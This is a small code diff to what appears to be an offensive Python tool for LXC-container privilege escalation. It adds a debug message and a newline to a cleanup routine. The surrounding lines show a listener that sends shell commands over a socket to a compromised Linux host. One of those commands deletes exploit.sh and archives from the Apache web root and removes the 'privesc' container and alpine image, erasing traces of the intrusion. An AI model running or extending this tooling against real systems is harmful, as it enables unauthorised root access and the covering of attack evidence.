@@ -102,6 +102,7 @@ def listen(ip,port, t2, r_port, file_name, general_info, arguments, rep):
 				time.sleep(0.4)
 				sys.stdout.write("\033[A" + ans.split("\n")[-1])
 				print("", flush=True)
+			print('[DEBBUG] Exiting While')
 		else:
 			# Do some random commands while root on the lxc container
 			time.sleep(0.5)
@@ -225,7 +226,7 @@ def recvall(sock):
 
 
 def cleanup(conn, file_name, general_info, rep):
-	conn.send('''cd $(grep -e DocumentRoot -R /etc/apache2/sites-enabled/ | awk '{ print $3 }') && rm -f *.tar.gz exploit.sh; lxc stop privesc && lxc delete privesc && lxc image delete alpine;'''.encode())
+	conn.send('''cd $(grep -e DocumentRoot -R /etc/apache2/sites-enabled/ | awk '{ print $3 }') && rm -f *.tar.gz exploit.sh; lxc stop privesc && lxc delete privesc && lxc image delete alpine;\n'''.encode())
 	if general_info['active'] == 'True':
 		try:
 			requests.get('http://'+ informAudittingStop(general_info), timeout=(1,1))
